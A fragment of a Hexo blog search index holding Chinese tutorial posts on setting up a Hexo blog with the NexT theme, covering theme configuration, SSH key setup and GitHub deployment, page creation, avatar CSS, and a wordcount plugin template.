https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: //cdn.bootcss.com/jquery/2.1.3/jquery.min.js # Internal version: 2.1.5 # Fancybox: http://fancyapps.com/fancybox/ fancybox: //cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js fancybox_css: //cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css # Internal version: 1.0.6 fastclick: //cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: //cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js # Internal version: 1.2.1 velocity: # Internal version: 1.2.1 velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: //cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest: //cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.0# 多说热评文章 true 或者 falseduoshuo_hotartical: truereward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！wechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg PS:可以不用一次性看完，理解下各个属性即可，官网也没有对所有配置的中文解释，只有一些例子配置对应的参数而已。 相信绝大数人都没看完，大家可以后面自己配置的时候再来看。 启用主题打开站点配置文件， 找到 theme 字段，并将其值更改为 next1theme: next 注意:后有个空格必须要有空格哦然后 hexo s 即可在localshost:4000地址里预览主题效果 更换主题外观next有三个主题样式 1234# Schemes#scheme: Musescheme: Mist#scheme: Pisces 我用的是第二个 更换语言为中文，在根目录配置文件下配置language: zh-Hans 1234567# Sitetitle: Water Sister&apos;s Blogsubtitle: 生活、技术个人博客description: 思考中.....author: Yang ZiHaolanguage: zh-Hanstimezone: 添加网站小图标在主题目录配置文件下设置 12# Put your favicon.ico into `hexo-site/source/` directory.favicon: /images/favicon.ico 大部分的设定都能在NexT的官方文档 里面找到，如侧栏、头像、打赏、评论、订阅、连接、分享、数据统计等等，在此就不多讲了，照着文档走就行了，接下只是个性定制的问题。所以给个官方文档大家可以自己去看一遍：http://theme-next.iissnan.com/theme-settings.html 部署发行项目前言假设前面已经注册了github帐号和创建了对应的仓库，通过配置SSH来建立连接。 生成SSH123$ ssh-keygen -t rsa -C &quot;邮件地址@youremail.com&quot;Generating public/private rsa key pair.Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):&lt;回车&gt; 系统会要求你输入密码，这里设置的密码主要是在你提交Git时弹出密码认证，不想输入直接回车 12Enter passphrase (empty for no passphrase):&lt;输入加密串&gt;Enter same passphrase again:&lt;再次输入加密串&gt; 成功后如图： 配置SSH找到id_rsa.pub 并复制文件内容id_rsa.pub文件一般位于电脑用户配置文件夹下的一个.ssh文件下C:\Users\你的用户名.ssh登录Github并添加密钥进入github首页在右上角选择settings设置。创建一个新的SSH key，图中显示我已经创建好了。title可以随便取 测试通过git bash链接到Git链接Git1$ ssh -T git@github.com 提示如下：yes123The authenticity of host &apos;github.com (207.65.227.44)&apos; can&apos;t be established.RSA key fingerprint is 16:27:42:18:60:1d:7b:13:d2:b5:c4:20:7e:56:86:d8:71:f3Are you sure you want to continue connecting (yes/no)? 以下为成功链接到Git 1Hi XXXX! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 使用Git bash简单的设置一下用户信息： 12git config --global user.name your namegit config --global user.email your_email@youremail.com 部署到Github在此之前，先安装Git部署插件 1npm install hexo-deployer-git --save 打开根目录配置文件，拉到底部，修改部署配置： 1234deploy: type: git repo: github: git@github.com:cduyzh/cduyzh.github.io.git,master 注意冒号后面是网站对应的用户名，接着就是/，然后再是你的项目名加上 .git,master 保存后终端执行 123hexo cleanhexo ghexo d 结果如下为成功上传 总结到这里基本上完成了hexo的配置和项目的上传，后面我会讲一些文章的编辑，分类，标签的运用，还会对next主题进行一些分析，如果想自己设置主题和样式建议先把next主题的官方中文文档看一下，我会对其中的一些进行解释。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2017年最新基于hexo搭建个人免费博客——基本设置和了解]]></title>
      <url>%2Fhexo-settings-2%2F</url>
      <content type="text"><![CDATA[前言前面的文章已经能让大家搭建起自己的博客，并通过网络访问了，通过基础的发布文章和编辑既可以实现博客的运作了，其他的一些包括分页和标签、分类等都不用自己来操作实现，只要通过命令hexo g就可以了，如果大家看过了next主题的官网中介绍的配置，我会帮助大家对其中描述不清的地方进行讲解。 理解文章和页面当你前面的做好了后，现在还需要建立三个页面：分类页categories、标签页tags、关于页about,以及一个html页面放到根目录source下，才能完善博客基本的内容。在根目录配置文件中有一个设置希望设置为true 12345678# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: true ##就是这个 原因是设置后当你新建一个页面后自动生成一个同名文件夹方便管理。123hexo new page categories hexo new page tagshexo new page about tags里index.md设置 12345---title: 标签date: 2017-03-01 19:31:10type: &quot;tags&quot;--- categories里index.md设置 12345---title: categoriesdate: 2017-03-01 19:42:08type: &quot;categories&quot;--- 主题目录下的配置文件设置如下 1234567menu: home: / categories: /categories about: /about archives: /archives tags: /tags commonweal: /404.html 一个文章应该包含以下属性在顶部 123456---date: 2017-03-07title: xxxxxxxxxtags: xxxx #如果不想加入标签可以为空categories: xxxxx #如果不想加入分类可以为空--- 添加Fork me on GitHub去网址https://github.com/blog/273-github-ribbons 挑选自己喜欢的样式，并复制代码，添加到themes\next\layout_layout.swig的body标签之内即可记得把里面的url换成自己的! 把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果修改themes\next\source\css_common\components\sidebar\sidebar-author.styl： 123456789101112131415161718192021222324.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: site-author-image-border-color; /* start*/ border-radius: 50% webkit-transition: 1.4s all; moz-transition: 1.4s all; ms-transition: 1.4s all; transition: 1.4s all; /* end */&#125;/* start */.site-author-image:hover &#123; background-color: #55DAE1; webkit-transform: rotate(360deg) scale(1.1); moz-transform: rotate(360deg) scale(1.1); ms-transform: rotate(360deg) scale(1.1); transform: rotate(360deg) scale(1.1);&#125;/* end */ 添加音乐去往网易云音乐搜索喜欢的音乐，点击生成外链播放器，复制代码直接放到博文末尾即可，height设为0可隐藏播放器，但仍然可以播放音乐，auto设成0可手动播放，默认是1自动播放，可把代码放到themes/next/layout/_custom/sidebar.swig文件里，播放器会显示在站点预览中 实现文章标题栏显示更多的文章信息hexo-wordcount实现这个是官方文档上没有提及的所以我来说下，可以让你的文章标题位置更加富含信息，本插件可以为文章标题位置添加，文章字数，文章预计阅读时间。 安装WORDCOUNT执行命令1npm install hexo-wordcount --save 主要功能字数统计:WordCount阅读时长预计:Min2Read总字数统计: TotalCount 查看post.swig模板模板位置：themes\next\layout_macro\post.swig 12345678910111213141516171819202122232425262728293031&#123;% if theme.post_wordcount.wordcount or theme.post_wordcount.min2read %&#125; &lt;div class=&quot;post-wordcount&quot;&gt; &#123;% if theme.post_wordcount.wordcount %&#125; &lt;span class=&quot;post-meta-item-icon&quot;&gt; &lt;i class=&quot;fa fa-edit&quot;&gt;&lt;/i&gt; &lt;/span&gt; &#123;% if theme.post_wordcount.item_text %&#125; &lt;span class=&quot;post-meta-item-text&quot;&gt;&#123;&#123; __(&apos;post.wordcount&apos;) &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;span title=&quot;&#123;&#123; __(&apos;post.wordcount&apos;) &#125;&#125;&quot; &#125;&#125;&quot;&gt; &#123;&#123; wordcount(post.content) &#125;&#125; 字 ##我在这里加了一个单位上去 &lt;/span&gt; &#123;% endif %&#125; &#123;% if theme.post_wordcount.wordcount and theme.post_wordcount.min2read %&#125; &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt; &#123;% endif %&#125; &#123;% if theme.post_wordcount.min2read %&#125; &lt;span class=&quot;post-meta-item-icon&quot;&gt; &lt;i class=&quot;fa fa-clock-o&quot;&gt;&lt;/i&gt; &lt;/span&gt; &#123;% if theme.post_wordcount.item_text %&#125; &lt;span class=&quot;post-meta-item-text&quot;&gt;&#123;&#123; __(&apos;post.min2read&apos;) &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;span title=&quot;&#123;&#123; __(&apos;post.min2read&apos;) &#125;&#125;&quot; &#125;&#125;&quot;&gt; &#123;&#123; min2read(post.content) &#125;&#125; 分钟 ##我在这里加了一个单位上去 &lt;/span&gt; &#123;% endif %&#125; &lt;/div&gt; &#123;% endif %&#125; 因为已经写好了代码，所以大家不用更改什么，只需要按自己需求来修改一些地方，我还对图标进行了修改在FontAwesome官网上找到一些图标替换了标签里对应的class值来实现目的。因为hexo默认引入了这个字体图标库，涉及到图标的地方都可以自行来更改。 其他主题配置另外评论系统推荐用多说，数据统计用不蒜子统计，搜索系统用local search,内容分享用多说分享，配置起来最简单好用。next主题的官网文档上写了相关配置的设置方法都是在配置文件里进行值的设定，操作起来很简单，我就不重复讲了，如有其他问题欢迎提问，后面我会讲如何来自定义CSS样式和更改里面的一些设置。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[结合hexo和github开发静态个人博客感想]]></title>
      <url>%2Freview-hexo%2F</url>
      <content type="text"><![CDATA[前言以前学习查资料的时候看到很多解决方法都是在博客里写的，所以一直打算建，但是传统的博客因为受到站点限制不能自由的DIY，样式也不好看，所以看到了github pages后萌生了用官方介绍的hexo来开发静态个性化博客。 准备上网查阅了很多的资料和回答，但大多数都是14，15年的版本和解决方法，虽然与17年的next主题差不多，但里面的改动也很多，所以吸收了很多博客主的经验和文章后，自己去看了hexo文档和next主题文档，大致可以进行自己的一些样式设计和DIY了。 过程等日后来完善此部分…. 结果等日后来完善此部分….]]></content>
    </entry>

    
  
  
</search>
